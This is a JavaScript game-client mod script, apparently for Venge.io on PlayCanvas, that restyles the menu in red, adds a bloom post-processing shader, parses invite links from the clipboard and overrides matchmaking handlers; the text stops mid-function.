setTimeout(() => {
    loadGameScript();
}, 1500);

function loadGameScript() {
    console.log("PREDMOD PATHER LOADED!");
    let a = (pc.app.root);
    let w = (window);
    // MENU
    w.M = a.findByName("Menu");
    w.M_BG = a.findByPath("MenuHolder/Menu/Background");
    w.M_GH = a.findByPath("MenuHolder/GameHolder");
    w.M_Shadow = a.findByPath("MenuHolder/Menu/Shadow");
    // MENU MATCH
    w.Match = a.findByPath("MenuHolder/Menu/Match");
    w.Match.children[4].name = "Customization2";
    w.Custom2 = w.Match.children[4];
    w.Side = a.findByPath("MenuHolder/Menu/Match/Side");
    w.Side_Match = a.findByPath("MenuHolder/Menu/Match/Side/Match");
    w.Side_Match_Invite = a.findByPath("MenuHolder/Menu/Match/Side/Match/Invite");
    w.Side_Match_Invite_Chat = a.findByPath("MenuHolder/Menu/Match/Side/Match/Invite/Chat");
    w.Side_Match_BG = a.findByPath("MenuHolder/Menu/Match/Side/Match/Background");
    //MINI PROFILE
    w.Profile = a.findByPath("MenuHolder/Menu/Match/Side/MiniProfile");
    w.Profile_CreateAccount = a.findByPath("MenuHolder/Menu/Match/Side/MiniProfile/CreateAccount");
    w.Profile_Profile = a.findByPath("MenuHolder/Menu/Match/Side/MiniProfile/Profile");
    w.Profile_Exp = a.findByPath("MenuHolder/Menu/Match/Side/MiniProfile/Profile/Experience");
    w.Profile_Exp_Bar = a.findByPath("MenuHolder/Menu/Match/Side/MiniProfile/Profile/Experience/Bar");
    //QUICK-MATCH
    w.QuickMatch = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch");
    w.FindMatch = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch/FindMatch");
    w.FindMatch_Text = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch/FindMatch/Text");
    //TOS CHANGELOG VERSION 
    w.ChangeLog = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch/ChangeLog");
    w.TOS = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch/TOS");
    w.Version = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch/Version");
    w.Beta = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch/Beta");
    // QUESTBAR
    w.QuestsBar = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch/QuestsBar");
    w.QuestsBar_Label = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch/QuestsBar/Label");
    w.QuestsBar_Bar_Fill = a.findByPath("MenuHolder/Menu/Match/Side/Match/QuickMatch/QuestsBar/Bar/Fill");

    w.Match_Slide = a.findByPath("MenuHolder/Menu/Match/Slider");
    w.Match_Weapon = a.findByPath("MenuHolder/Menu/Match/Weapon");
    w.Match_Banner = a.findByPath("MenuHolder/Menu/Match/Banner");
    w.Match_Friends = a.findByPath("MenuHolder/Menu/Match/Friends");
    w.Match_Streamer = a.findByPath("MenuHolder/Menu/Match/Streamer");
    w.Custom1 = a.findByPath("MenuHolder/Menu/Match/Customization");
    w.Match_SpecialOffer = a.findByPath("MenuHolder/Menu/Match/SpecialOffer");
    w.Match_SpecialOffer_BG = a.findByPath("MenuHolder/Menu/Match/SpecialOffer/Background");
    // MENU SHOP
    w.Shop = a.findByPath("MenuHolder/Menu/Shop");
    w.Shop_Buy = a.findByPath("MenuHolder/Menu/Shop/Buy");
    w.Shop_Content = a.findByPath("MenuHolder/Menu/Shop/Content");
    w.Shop_Currency = a.findByPath("MenuHolder/Menu/Shop/Currency");
    w.Shop_MouseArea = a.findByPath("MenuHolder/Menu/Shop/MouseArea");
    w.Shop_Swipe = a.findByPath("MenuHolder/Menu/Shop/Swipe");
    w.Shop_List = a.findByPath("MenuHolder/Menu/Shop/List");
    w.Shop_Transactiontoken = a.findByPath("MenuHolder/Menu/Shop/Transactiontoken");
    w.Shop_Featured = a.findByPath("MenuHolder/Menu/Shop/Featured");
    w.Shop_Crates = a.findByPath("MenuHolder/Menu/Shop/Crates");
    w.Shop_BuyOffer = a.findByPath("MenuHolder/Menu/Shop/BuyOffer");
    w.Shop_Balance = a.findByPath("MenuHolder/Menu/Shop/Balance");
    w.Shop_Youtube = a.findByPath("MenuHolder/Menu/Shop/Youtube");
    // MENU CUSTOMS
    w.Custom = a.findByPath("MenuHolder/Menu/Custom");
    w.Custom_BG = a.findByPath("MenuHolder/Menu/Custom/Background");
    w.Custom_Content = a.findByPath("MenuHolder/Menu/Custom/Content");
    w.Custom_Swipe = a.findByPath("MenuHolder/Menu/Custom/Swipe");
    w.Custom_List = a.findByPath("MenuHolder/Menu/Custom/List");
    w.Custom_Modes = a.findByPath("MenuHolder/Menu/Custom/Modes");
    w.Custom_PlayButton = a.findByPath("MenuHolder/Menu/Custom/PlayButton");
    w.Custom_Invite = a.findByPath("MenuHolder/Menu/Custom/Invite");
    w.Custom_MapEditor = a.findByPath("MenuHolder/Menu/Custom/MapEditor");
    Match.children[4].name = "Customization2";
    // MENU CONTENT
    w.Content = a.findByPath("MenuHolder/Menu/Content");
    w.Content_CustomOld = a.findByPath("MenuHolder/Menu/Content/CustomOld");
    w.Content_Leaderboard = a.findByPath("MenuHolder/Menu/Content/Leaderboard");
    w.Content_Market = a.findByPath("MenuHolder/Menu/Content/Market");
    w.Content_Account = a.findByPath("MenuHolder/Menu/Content/Account");
    w.Content_General = a.findByPath("MenuHolder/Menu/Content/General");
    // SETTINGS
    w.S = a.findByPath("MenuHolder/Menu/Content/Settings");
    w.S_BG = a.findByPath("MenuHolder/Menu/Content/Settings/Background");
    w.S_BG_U = a.findByPath("MenuHolder/Menu/Content/Settings/Background/Untitled");
    w.S_Sidebar = a.findByPath("MenuHolder/Menu/Content/Settings/Sidebar");
    w.S_Sidebar_BG = a.findByPath("MenuHolder/Menu/Content/Settings/Sidebar/Background");
    w.S_Sidebar_BTN = a.findByPath("MenuHolder/Menu/Content/Settings/Sidebar/Button");
    w.S_Common = a.findByPath("MenuHolder/Menu/Content/Settings/Common");
    w.S_Keyboard = a.findByPath("MenuHolder/Menu/Content/Settings/Keyboard");
    w.S_Audio = a.findByPath("MenuHolder/Menu/Content/Settings/Audio");
    w.S_Misc = a.findByPath("MenuHolder/Menu/Content/Settings/Miscellaneous");
    w.S_Customs = a.findByPath("MenuHolder/Menu/Content/Settings/Customs");
    w.S_Game = a.findByPath("MenuHolder/Menu/Content/Settings/Game");
    w.S_Client = a.findByPath("MenuHolder/Menu/Content/Settings/Client");
    w.S_Graphics = a.findByPath("MenuHolder/Menu/Content/Settings/Graphics");
    // MENU HEADER
    w.M_Header = a.findByPath("MenuHolder/Menu/Header");
    w.M_Header_Background = a.findByPath("MenuHolder/Menu/Header/Background");
    w.M_Header_Group = a.findByPath("MenuHolder/Menu/Header/Group");
    // MENU FOOTER
    w.Footer = a.findByPath("MenuHolder/Menu/Footer");
    w.Footer_Links = a.findByPath("MenuHolder/Menu/Footer/Links");
    w.Footer_banners = a.findByPath("MenuHolder/Menu/Footer/Banners");
    // MENU SELECTION
    w.Selection = a.findByPath("MenuHolder/Menu/Selection");
    //MENU COINS
    w.Coins = a.findByPath("MenuHolder/Menu/Coins");
    w.Coins_CreatorCode = a.findByPath("MenuHolder/Menu/Coins/CreatorCode");
    // MENU CHARACTER
    w.Character = a.findByPath("MenuHolder/Menu/Character");
    // MENU MAP
    w.Map = a.findByPath("MenuHolder/Menu/Map");
    // MENU EMOJI
    w.Emoji = a.findByPath("MenuHolder/Menu/Emoji");
    // MENU SERVER
    w.Server = a.findByPath("MenuHolder/Menu/Server");
    // MENU DAILY-QUEST
    w.DailyQuest = a.findByPath("MenuHolder/Menu/DailyQuest");
    w.DailyQuest_Popup = a.findByPath("MenuHolder/Menu/DailyQuest/Popup");
    w.DailyQuest_Untitled = a.findByPath("MenuHolder/Menu/DailyQuest/Untitled");
    // MENU MAPS
    w.Maps = a.findByPath("MenuHolder/Menu/Maps");
    w.Maps_Popup = a.findByPath("MenuHolder/Menu/Maps/Popup");
    w.Maps_Untitled = a.findByPath("MenuHolder/Menu/Maps/Untitled");
    // MENU UPDATE
    w.Update = a.findByPath("MenuHolder/Menu/Update");
    w.Update_Title = a.findByPath("MenuHolder/Menu/Update/Title");
    w.Update_VersionCode = a.findByPath("MenuHolder/Menu/Update/VersionCode");
    w.Update_Refresh = a.findByPath("MenuHolder/Menu/Update/Refresh");
    w.Update_Refresh_Icon = a.findByPath("MenuHolder/Menu/Update/Refresh/Icon");
    w.Update_Refresh_Text = a.findByPath("MenuHolder/Menu/Update/Refresh/Text");
    w.Update_Text = a.findByPath("MenuHolder/Menu/Update/Text");
    w.Update_Untitled = a.findByPath("MenuHolder/Menu/Update/Untitled");
    // MENU QUESTS
    w.Quests = a.findByPath("MenuHolder/Menu/Quests");
    w.Quests_Popup = a.findByPath("MenuHolder/Menu/Quests/Popup");
    w.Quests_ = a.findByPath("MenuHolder/Menu/Quests/ClaimReward");
    w.Quests_ = a.findByPath("MenuHolder/Menu/Quests/ResetQuests");
    w.Quests_Untitled = a.findByPath("MenuHolder/Menu/Quests/Untitled");
    // MENU PURCHASE
    w.Purchase = a.findByPath("MenuHolder/Menu/Purchase");
    w.Purchase_Popup = a.findByPath("MenuHolder/Menu/Purchase/Popup");
    w.Purchase_BuyItem = a.findByPath("MenuHolder/Menu/Purchase/BuyItem");
    w.Purchase_Untitled = a.findByPath("MenuHolder/Menu/Purchase/Untitled");
    // MENU LOADOUT
    w.Loadout = a.findByPath("MenuHolder/Menu/Loadout");
    w.Loadout_Popup = a.findByPath("MenuHolder/Menu/Loadout/Popup");
    w.Loadout_Weapons = a.findByPath("MenuHolder/Menu/Loadout/Weapons");
    w.Loadout_SetLoadout = a.findByPath("MenuHolder/Menu/Loadout/SetLoadout");
    w.Loadout_Untitled = a.findByPath("MenuHolder/Menu/Loadout/Untitled");
    // MENU RATING
    w.Rating = a.findByPath("MenuHolder/Menu/Rating");
    w.Rating_Untitled = a.findByPath("MenuHolder/Menu/Rating/Untitled");
    w.Rating_Popup = a.findByPath("MenuHolder/Menu/Rating/Popup");
    // MENU CHRISTMAS
    w.Christmas = a.findByPath("MenuHolder/Menu/Christmas");
    w.Christmas_Untitled = a.findByPath("MenuHolder/Menu/Christmas/Untitled");
    w.Christmas_Popup = a.findByPath("MenuHolder/Menu/Christmas/Popup");
    // MENU NOTIFY
    w.M_Notify = a.findByPath("MenuHolder/Menu/Notify");
    w.M_Notify_Notification = a.findByPath("MenuHolder/Menu/Notify/Notification");
    // MENU STREAM
    w.Stream = a.findByPath("MenuHolder/Menu/Stream");
    w.Stream_Text = a.findByPath("MenuHolder/Menu/Stream/Text");
    w.Stream_Icon = a.findByPath("MenuHolder/Menu/Stream/Icon");
    w.Stream_SteamVideo = a.findByPath("MenuHolder/Menu/Stream/Stream-Video");
    w.Stream_Untitled = a.findByPath("MenuHolder/Menu/Stream/Untitled");
    // MENU OFFER
    w.Offer = a.findByPath("MenuHolder/Menu/Offer");
    w.Offer_Popup = a.findByPath("MenuHolder/Menu/Offer/Popup");
    w.Offer_Untitled = a.findByPath("MenuHolder/Menu/Offer/Untitled");
    // MENU BOOST
    w.Boost = a.findByPath("MenuHolder/Menu/Boost");
    w.Boost_Popup = a.findByPath("MenuHolder/Menu/Boost/Popup");
    w.Boost_Untitled = a.findByPath("MenuHolder/Menu/Boost/Untitled");
    // MENU MATCHMAKING
    w.MatchMaking = a.findByPath("MenuHolder/Menu/Boost");
    w.MatchMaking_Popup = a.findByPath("MenuHolder/Menu/Boost/Popup");
    w.MatchMaking_Shadow = a.findByPath("MenuHolder/Menu/Boost/Shadow");
    // MENU WAITING
    w.Waiting = a.findByPath("MenuHolder/Menu/Waiting");
    w.Waiting_Text = a.findByPath("MenuHolder/Menu/Waiting/Text");
    w.Waiting_Untitled = a.findByPath("MenuHolder/Menu/Waiting/Untitled");
    // MENU FOUND
    w.Found = a.findByPath("MenuHolder/Menu/Found");
    w.Found_Center = a.findByPath("MenuHolder/Menu/Found/Center");
    w.Found_Untitled = a.findByPath("MenuHolder/Menu/Found/Untitled");
    // MENU LOADING
    w.Loading = a.findByPath("MenuHolder/Menu/Loading");
    w.Loading_Untitled = a.findByPath("MenuHolder/Menu/Loading/Untitled");
    // MENU MOBILE-STORE
    w.MobileStore = a.findByPath("MenuHolder/Menu/MobileStore");
    w.MobileStore_Group = a.findByPath("MenuHolder/Menu/MobileStore/Group");
    w.MobileStore_Untitled = a.findByPath("MenuHolder/Menu/MobileStore/Untitled");
    // MENU TOOLTIP
    w.Tooltip = a.findByPath("MenuHolder/Menu/Tooltip");
    w.Tooltip_Text = a.findByPath("MenuHolder/Menu/Tooltip/Text");
    w.Tooltip_Untitled = a.findByPath("MenuHolder/Menu/Tooltip/Untitled");
    // MENU ALERT
    w.Alert = a.findByPath("MenuHolder/Menu/Alert");
    w.Alert_Popup = a.findByPath("MenuHolder/Menu/Alert/Popup");
    w.Alert_Untitled = a.findByPath("MenuHolder/Menu/Alert/Untitled");
    // MENU CAMPAING
    w.Campaing = a.findByPath("MenuHolder/Menu/Campaing");
    w.Campaing_Popup = a.findByPath("MenuHolder/Menu/Campaing/Popup");
    w.Campaing_Untitled = a.findByPath("MenuHolder/Menu/Campaing/Untitled");










































    pc.extend(
        pc,
        (function() {
            var SAMPLE_COUNT = 15;

            function computeGaussian(n, theta) {
                return (
                    (1.0 / Math.sqrt(2 * Math.PI * theta)) *
                    Math.exp(-(n * n) / (2 * theta * theta))
                );
            }

            function calculateBlurValues(
                sampleWeights,
                sampleOffsets,
                dx,
                dy,
                blurAmount
            ) {
                // Look up how many samples our gaussian blur effect supports.

                // Create temporary arrays for computing our filter settings.
                // The first sample always has a zero offset.
                sampleWeights[0] = computeGaussian(0, blurAmount);
                sampleOffsets[0] = 0;
                sampleOffsets[1] = 0;

                // Maintain a sum of all the weighting values.
                var totalWeights = sampleWeights[0];

                // Add pairs of additional sample taps, positioned
                // along a line in both directions from the center.
                var i, len;
                for (i = 0, len = Math.floor(SAMPLE_COUNT / 2); i < len; i++) {
                    // Store weights for the positive and negative taps.
                    var weight = computeGaussian(i + 1, blurAmount);
                    sampleWeights[i * 2] = weight;
                    sampleWeights[i * 2 + 1] = weight;
                    totalWeights += weight * 2;

                    // To get the maximum amount of blurring from a limited number of
                    // pixel shader samples, we take advantage of the bilinear filtering
                    // hardware inside the texture fetch unit. If we position our texture
                    // coordinates exactly halfway between two texels, the filtering unit
                    // will average them for us, giving two samples for the price of one.
                    // This allows us to step in units of two texels per sample, rather
                    // than just one at a time. The 1.5 offset kicks things off by
                    // positioning us nicely in between two texels.
                    var sampleOffset = i * 2 + 1.5;

                    // Store texture coordinate offsets for the positive and negative taps.
                    sampleOffsets[i * 4] = dx * sampleOffset;
                    sampleOffsets[i * 4 + 1] = dy * sampleOffset;
                    sampleOffsets[i * 4 + 2] = -dx * sampleOffset;
                    sampleOffsets[i * 4 + 3] = -dy * sampleOffset;
                }

                // Normalize the list of sample weightings, so they will always sum to one.
                for (i = 0, len = sampleWeights.length; i < len; i++) {
                    sampleWeights[i] /= totalWeights;
                }
            }

            /**
             * @name pc.BloomEffect
             * @class Implements the BloomEffect post processing effect
             * @constructor Creates new instance of the post effect.
             * @extends pc.PostEffect
             * @param {pc.GraphicsDevice} graphicsDevice The graphics device of the application
             * @property {Number} bloomThreshold Only pixels brighter then this threshold will be processed. Ranges from 0 to 1
             * @property {Number} blurAmount Controls the amount of blurring.
             * @property {Number} bloomIntensity The intensity of the effect.
             */
            var BloomEffect = function(graphicsDevice) {
                // Shaders
                var attributes = {
                    aPosition: pc.SEMANTIC_POSITION,
                };

                var passThroughVert = [
                    "attribute vec2 aPosition;",
                    "",
                    "varying vec2 vUv0;",
                    "",
                    "void main(void)",
                    "{",
                    "    gl_Position = vec4(aPosition, 0.0, 1.0);",
                    "    vUv0 = (aPosition + 1.0) * 0.5;",
                    "}",
                ].join("\n");

                // Pixel shader extracts the brighter areas of an image.
                // This is the first step in applying a bloom postprocess.
                var bloomExtractFrag = [
                    "precision " + graphicsDevice.precision + " float;",
                    "",
                    "varying vec2 vUv0;",
                    "",
                    "uniform sampler2D uBaseTexture;",
                    "uniform float uBloomThreshold;",
                    "",
                    "void main(void)",
                    "{",
                    // Look up the original image color.
                    "    vec4 color = texture2D(uBaseTexture, vUv0);",
                    "",
                    // Adjust it to keep only values brighter than the specified threshold.
                    "    gl_FragColor = clamp((color - uBloomThreshold) / (1.0 - uBloomThreshold), 0.0, 1.0);",
                    "}",
                ].join("\n");

                // Pixel shader applies a one dimensional gaussian blur filter.
                // This is used twice by the bloom postprocess, first to
                // blur horizontally, and then again to blur vertically.
                var gaussianBlurFrag = [
                    "precision " + graphicsDevice.precision + " float;",
                    "",
                    "#define SAMPLE_COUNT " + SAMPLE_COUNT,
                    "",
                    "varying vec2 vUv0;",
                    "",
                    "uniform sampler2D uBloomTexture;",
                    "uniform vec2 uBlurOffsets[SAMPLE_COUNT];",
                    "uniform float uBlurWeights[SAMPLE_COUNT];",
                    "",
                    "void main(void)",
                    "{",
                    "    vec4 color = vec4(0.0);",
                    // Combine a number of weighted image filter taps.
                    "    for (int i = 0; i < SAMPLE_COUNT; i++)",
                    "    {",
                    "        color += texture2D(uBloomTexture, vUv0 + uBlurOffsets[i]) * uBlurWeights[i];",
                    "    }",
                    "",
                    "    gl_FragColor = color;",
                    "}",
                ].join("\n");

                // Pixel shader combines the bloom image with the original
                // scene, using tweakable intensity levels.
                // This is the final step in applying a bloom postprocess.
                var bloomCombineFrag = [
                    "precision " + graphicsDevice.precision + " float;",
                    "",
                    "varying vec2 vUv0;",
                    "",
                    "uniform float uBloomEffectIntensity;",
                    "uniform sampler2D uBaseTexture;",
                    "uniform sampler2D uBloomTexture;",
                    "",
                    "void main(void)",
                    "{",
                    // Look up the bloom and original base image colors.
                    "    vec4 bloom = texture2D(uBloomTexture, vUv0) * uBloomEffectIntensity;",
                    "    vec4 base = texture2D(uBaseTexture, vUv0);",
                    "",
                    // Darken down the base image in areas where there is a lot of bloom,
                    // to prevent things looking excessively burned-out.
                    "    base *= (1.0 - clamp(bloom, 0.0, 1.0));",
                    "",
                    // Combine the two images.
                    "    gl_FragColor = base + bloom;",
                    "}",
                ].join("\n");

                this.extractShader = new pc.Shader(graphicsDevice, {
                    attributes: attributes,
                    vshader: passThroughVert,
                    fshader: bloomExtractFrag,
                });
                this.blurShader = new pc.Shader(graphicsDevice, {
                    attributes: attributes,
                    vshader: passThroughVert,
                    fshader: gaussianBlurFrag,
                });
                this.combineShader = new pc.Shader(graphicsDevice, {
                    attributes: attributes,
                    vshader: passThroughVert,
                    fshader: bloomCombineFrag,
                });

                // Render targets
                var width = graphicsDevice.width;
                var height = graphicsDevice.height;
                this.targets = [];
                for (var i = 0; i < 2; i++) {
                    var colorBuffer = new pc.Texture(graphicsDevice, {
                        format: pc.PIXELFORMAT_R8_G8_B8_A8,
                        width: width >> 1,
                        height: height >> 1,
                    });
                    colorBuffer.minFilter = pc.FILTER_LINEAR;
                    colorBuffer.magFilter = pc.FILTER_LINEAR;
                    colorBuffer.addressU = pc.ADDRESS_CLAMP_TO_EDGE;
                    colorBuffer.addressV = pc.ADDRESS_CLAMP_TO_EDGE;
                    var target = new pc.RenderTarget(graphicsDevice, colorBuffer, {
                        depth: false,
                    });

                    this.targets.push(target);
                }

                // Effect defaults
                this.bloomThreshold = 0.25;
                this.blurAmount = 4;
                this.bloomIntensity = 1.25;

                // Uniforms
                this.sampleWeights = new Float32Array(SAMPLE_COUNT);
                this.sampleOffsets = new Float32Array(SAMPLE_COUNT * 2);
            };

            BloomEffect = pc.inherits(BloomEffect, pc.PostEffect);

            BloomEffect.prototype = pc.extend(BloomEffect.prototype, {
                render: function(inputTarget, outputTarget, rect) {
                    var device = this.device;
                    var scope = device.scope;

                    // Pass 1: draw the scene into rendertarget 1, using a
                    // shader that extracts only the brightest parts of the image.
                    scope.resolve("uBloomThreshold").setValue(this.bloomThreshold);
                    scope.resolve("uBaseTexture").setValue(inputTarget.colorBuffer);
                    pc.drawFullscreenQuad(
                        device,
                        this.targets[0],
                        this.vertexBuffer,
                        this.extractShader
                    );

                    // Pass 2: draw from rendertarget 1 into rendertarget 2,
                    // using a shader to apply a horizontal gaussian blur filter.
                    calculateBlurValues(
                        this.sampleWeights,
                        this.sampleOffsets,
                        1.0 / this.targets[1].width,
                        0,
                        this.blurAmount
                    );
                    scope.resolve("uBlurWeights[0]").setValue(this.sampleWeights);
                    scope.resolve("uBlurOffsets[0]").setValue(this.sampleOffsets);
                    scope
                        .resolve("uBloomTexture")
                        .setValue(this.targets[0].colorBuffer);
                    pc.drawFullscreenQuad(
                        device,
                        this.targets[1],
                        this.vertexBuffer,
                        this.blurShader
                    );

                    // Pass 3: draw from rendertarget 2 back into rendertarget 1,
                    // using a shader to apply a vertical gaussian blur filter.
                    calculateBlurValues(
                        this.sampleWeights,
                        this.sampleOffsets,
                        0,
                        1.0 / this.targets[0].height,
                        this.blurAmount
                    );
                    scope.resolve("uBlurWeights[0]").setValue(this.sampleWeights);
                    scope.resolve("uBlurOffsets[0]").setValue(this.sampleOffsets);
                    scope
                        .resolve("uBloomTexture")
                        .setValue(this.targets[1].colorBuffer);
                    pc.drawFullscreenQuad(
                        device,
                        this.targets[0],
                        this.vertexBuffer,
                        this.blurShader
                    );

                    // Pass 4: draw both rendertarget 1 and the original scene
                    // image back into the main backbuffer, using a shader that
                    // combines them to produce the final bloomed result.
                    scope
                        .resolve("uBloomEffectIntensity")
                        .setValue(this.bloomIntensity);
                    scope
                        .resolve("uBloomTexture")
                        .setValue(this.targets[0].colorBuffer);
                    scope.resolve("uBaseTexture").setValue(inputTarget.colorBuffer);
                    pc.drawFullscreenQuad(
                        device,
                        outputTarget,
                        this.vertexBuffer,
                        this.combineShader,
                        rect
                    );
                },
            });

            return {
                BloomEffect: BloomEffect,
            };
        })()
    );
    var Bloom = pc.createScript("bloom");
    Bloom.attributes.add("bloomIntensity", {
        type: "number",
        default: 1,
        min: 0,
        title: "Intensity",
    });
    Bloom.attributes.add("bloomThreshold", {
        type: "number",
        default: 0.25,
        min: 0,
        max: 1,
        precision: 2,
        title: "Threshold",
    });
    Bloom.attributes.add("blurAmount", {
        type: "number",
        default: 4,
        min: 1,
        title: "Blur amount",
    });
    Bloom.prototype.initialize = function() {
        this.effect = new pc.BloomEffect(this.app.graphicsDevice);

        this.effect.bloomThreshold = this.bloomThreshold;
        this.effect.blurAmount = this.blurAmount;
        this.effect.bloomIntensity = this.bloomIntensity;

        var queue = this.entity.camera.postEffects;

        queue.addEffect(this.effect);

        this.on(
            "attr",
            function(name, value) {
                this.effect[name] = value;
            },
            this
        );

        this.on("state", function(enabled) {
            if (enabled) {
                queue.addEffect(this.effect);
            } else {
                queue.removeEffect(this.effect);
            }
        });

        this.on("destroy", function() {
            queue.removeEffect(this.effect);
        });
    };
    var bloom = new pc.BloomEffect(pc.app.graphicsDevice);
    window.bloom = bloom;
    window.menu = pc.app.root.findByName("Menu");

    //Client loaded message
    Footer.enabled = false;
    Update_Title.enabled = false;
    Update_VersionCode.enabled = false;
    Update_Text.enabled = false;
    Update_Refresh_Icon.enabled = false;
    Update_Refresh_Text.element.text = "PREDMOD-VE LOADED!";

    setTimeout(() => {
        var timeleft = 1;
        var downloadTimer = setInterval(function() {
            timeleft -= 0.0035;
            Update_Refresh_Text.element.opacity = timeleft;
            Update.element.opacity = timeleft;
            if (timeleft <= 0) {
                clearInterval(downloadTimer);
                Update.enabled = false;
            }
        }, 1);
    }, 1500);
    Update_Refresh_Text.element.color = { r: 1, g: 0, b: 0, a: 1, };
    Update_Refresh_Text.setLocalScale(1, 1, 1);
    Update_Refresh.setLocalPosition(-10, -50, 0);
    Update.setLocalPosition(-725, -115, 0);
    Update.enabled = true;

    //Menu.js
    Shop_Buy.enabled = true; // TODO QUESTION GUNCHI OR NEXI ABOUT THIS ONE SEEMS FINE TO ME BUT EH??
    M_BG.element.margin = { x: -240, y: -150, z: -240, w: -150 };
    window.resolution = pc.app.root.findByName("Quality");
    resolution.script.slider.max = 110;
    FindMatch.element.color = { r: 1, g: 0, b: 0, a: 1, };
    FindMatch.button.data.hoverTint = { r: 1, g: 1, b: 1, a: 1 };
    FindMatch_Text.element.text = "release the predator";
    FindMatch_Text.setLocalScale(0.5, 0.5, 0.5);
    FindMatch_Text.element.color = { r: 1, g: 1, b: 1, a: 1 };
    Profile.element.opacity = 0.5;
    Profile.element.color = { r: 0.25, g: 0, b: 0, a: 0.5 };
    Side_Match_BG.element.color = { r: 0.25, g: 0, b: 0, a: 0.5, };
    QuestsBar.element.opacity = 0.5;
    QuestsBar_Bar_Fill.element.color = { r: 1, g: 0, b: 0, a: 1, };
    window.questbar = pc.app.root.findByName("QuestsBar");
    QuestsBar_Label.element.color = { r: 1, g: 0, b: 0, a: 1, };
    ChangeLog.element.color = { r: 1, g: 0, b: 0, a: 1, };
    TOS.element.color = { r: 1, g: 0, b: 0, a: 1, };
    Version.element.color = { r: 1, g: 0, b: 0, a: 1, };
    Beta.element.text = "PredMod Script v0.3VE";
    Beta.element.color = { r: 1, g: 1, b: 1, a: 1, };
    Side_Match_Invite_Chat.setLocalPosition(124.5, 214.786, 0);
    Profile_CreateAccount.element.color = { r: 1, g: 0, b: 0, a: 0.5, };
    Profile_CreateAccount.element.opacity = 0.5;
    Profile_Profile.element.color = { r: 0.25, g: 0, b: 0, a: 0.5, };
    Profile_Profile.element.opacity = 0.5;
    Profile_Exp.element.color = { r: 0, g: 0, b: 0, a: 1, };
    Profile_Exp_Bar.element.color = { r: 1, g: 0, b: 0, a: 1 };
    Side.setLocalPosition(-10, 75, 0);
    Custom1.element.color = { r: 0.25, g: 0, b: 0, a: 0.5, };
    Custom1.button.data.hoverTint = { r: 1, g: 0, b: 0, a: 1, };
    Custom1.element.opacity = 0.4;
    Match_Weapon.element.color = { r: 0.25, g: 0, b: 0, a: 0.5, };
    Match_Weapon.button.data.hoverTint = { r: 1, g: 0, b: 0, a: 1, };
    Match_Weapon.element.opacity = 0.4;
    Custom2.element.color = { r: 0.25, g: 0, b: 0, a: 0.5, };
    Custom2.button.data.hoverTint = { r: 1, g: 0, b: 0, a: 1, };
    Custom2.element.opacity = 0.4;
    Custom1.setLocalPosition(-1, -150, 0);
    Match_Friends.setLocalPosition(0, -130, 0);
    Match_SpecialOffer_BG.element.color = { r: 0.25, g: 0, b: 0, a: 0.5, };
    Match_SpecialOffer_BG.element.opacity = 0.5;
    Match_Banner.enabled = false;
    Side_Match.setLocalPosition(-12, -210, 0);
    Profile.setLocalPosition(-40, 25, 0);
    Match_Friends.element.opacity = 0.2;
    Match_Friends.element.color = { r: 0.7, g: 0, b: 0, a: 0.1 };
    Match_Friends.button.data.hoverTint = { r: 1, g: 0, b: 0, a: 1, };
    QuestsBar.setLocalPosition(220, -10, 0);
    M_GH.setLocalPosition(-2.3, 0, 0);

    function LinkBox() {
        function input(msg) {
            var prompting = prompt({
                title: msg,
                label: "Please enter your Invite link here",
                value: paste,
                inputAttrs: {
                    type: "url",
                },
                type: "input",
            });
            return prompting;
        }

        function question() {
            const choice = dialog.showMessageBoxSync(initWin, {
                type: "question",
                buttons: ["Play", "Spectate"],
                title: "Join",
                message: "Would you like to spectate or play?",
                defaultId: 0,
                cancelId: 3,
            });
            return choice;
        }

        function isPaste(message, isSpectate) {
            let arr1 = message.split("#");
            let inviteCode = arr1[arr1.length - 1];

            if (isSpectate) {
                initWin.loadURL(`${__dirname}/index.html#Spectate:${inviteCode}`);
            } else {
                initWin.loadURL(`${__dirname}/index.html#${inviteCode}`);
            }
        }

        // !!!!! CHECKS IF LINK IS ALREADY COPIED !!!!!
        let paste = clipboard.readText();
        var choice = question();
        if (paste.indexOf("venge.io/#") === -1) {
            paste = "https://venge.io/#00000";
            if (choice === 0) {
                input("Play").then((r) => {
                    isPaste(r, false);
                });
            } else {
                if (choice === 1) {
                    input("Spectate").then((r) => {
                        isPaste(r, true);
                    });
                }
            }
        } else {
            if (choice === 0) {
                isPaste(paste, false);
            } else {
                if (choice === 1) {
                    isPaste(paste, true);
                }
            }
        }
    };

    pc.app.assets.getAssetById("37459201").preload = true;

    RoomManager.prototype.rematchmaking = function() {
        (this.time = 0),
        console.log("Rematchmaking..."),
            this.app.fire("RoomManager:Leave", !0),
            this.app.fire("Analytics:Event", "Room", "Rematchmaking"),
            (this.matchmakingTitle.element.text = "Searching for players..."),
            (this.matchmakingCancel.enabled = !0),
            setTimeout(
                function(t) {
                    t.startMatchmaking();
                },
                25,
                this
            );
    };

    Menu.prototype.onMatchFound = function() {
        (this.isMatchFound = !0),
        (this.app.scene.layers.getLayerByName("Lightroom").enabled = !1),
        (this.app.scene.layers.getLayerByName("Lightroom-Top").enabled = !1),
        clearTimeout(this.bannerTimeout),
            this.app.fire("Ads:BannerDestroy", "venge-io_728x90", "728x90"),
            this.app.fire("DOM:Clear", !0),
            this.app.off("Player:Character"),
            this.app.fire("Popup:Close", !0),
            (this.matchFoundBackground.enabled = !0),
            this.matchFoundBackground
            .tween(this.matchFoundBackground.element)
            .to({ opacity: 1 }, 1, pc.QuarticOut)
            .start(),
            (this.matchFoundRectangle.element.opacity = 1),
            this.matchFoundRectangle.setLocalScale(0, 0, 0),
            this.matchFoundCenter.setLocalScale(3, 3, 3),
            this.matchFoundRectangle
            .tween(this.matchFoundRectangle.getLocalScale())
            .to({ x: 1, y: 1, z: 1 }, 0.5, pc.QuarticOut)
            .start(),
            this.matchFoundRectangle
            .tween(this.matchFoundRectangle.element)
            .to({ opacity: 0.1 }, 0.5, pc.QuarticOut)
            .start(),
            this.matchFoundCenter
            .tween(this.matchFoundCenter.getLocalScale())
